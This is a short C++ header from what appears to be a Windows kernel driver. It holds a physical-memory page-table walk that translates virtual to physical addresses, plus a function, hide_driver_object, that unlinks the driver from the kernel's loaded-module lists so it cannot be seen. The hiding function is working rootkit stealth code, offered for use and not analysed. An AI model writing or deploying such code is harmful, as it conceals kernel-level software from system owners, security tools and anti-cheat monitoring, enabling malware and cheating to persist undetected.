#pragma once
//
#include "..\source\stdafx.h"
#include "defs.h"

namespace utils
{
	auto translate_linear(
		UINT64 directory_base,
		UINT64 address) -> UINT64 {
		directory_base &= ~0xf;

		virt_addr_t virt_base{}; virt_base.value = (PVOID)address;


		auto virt_addr = address & ~(~0ul << 12);
		auto pte = ((address >> 12) & (0x1ffll));
		auto pt = ((address >> 21) & (0x1ffll));
		auto pd = ((address >> 30) & (0x1ffll));
		auto pdp = ((address >> 39) & (0x1ffll));
		auto p_mask = ((~0xfull << 8) & 0xfffffffffull);
		size_t readsize = 0;
		UINT64 pdpe = 0;
		read_physical(PVOID(directory_base + 8 * pdp), &pdpe, sizeof(pdpe), &readsize);
		if (~pdpe & 1) {
			return 0;
		}
		UINT64 pde = 0;
		read_physical(PVOID((pdpe & p_mask) + 8 * pd), &pde, sizeof(pde), &readsize);
		if (~pde & 1) {
			return 0;
		}
		if (pde & 0x80)
			return (pde & (~0ull << 42 >> 12)) + (address & ~(~0ull << 30));
		UINT64 pteAddr = 0;
		read_physical(PVOID((pde & p_mask) + 8 * pt), &pteAddr, sizeof(pteAddr), &readsize);
		if (~pteAddr & 1) {
			return 0;
		}
		if (pteAddr & 0x80) {
			return (pteAddr & p_mask) + (address & ~(~0ull << 21));
		}
		address = 0;
		read_physical(PVOID((pteAddr & p_mask) + 8 * pte), &address, sizeof(address), &readsize);
		address &= p_mask;
		if (!address) {
			return 0;
		}
		return address + virt_addr;
	}

	void hide_driver_object(PDRIVER_OBJECT DriverObject) { //credit: redshirtfan
		PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
		if (!entry) {
			return;
		}
		RemoveEntryList(&entry->InLoadOrderLinks);
		RemoveEntryList(&entry->InMemoryOrderLinks);
		RemoveEntryList(&entry->InInitializationOrderLinks);
		InitializeListHead(&entry->InLoadOrderLinks);
		InitializeListHead(&entry->InMemoryOrderLinks);
		InitializeListHead(&entry->InInitializationOrderLinks);
	}
}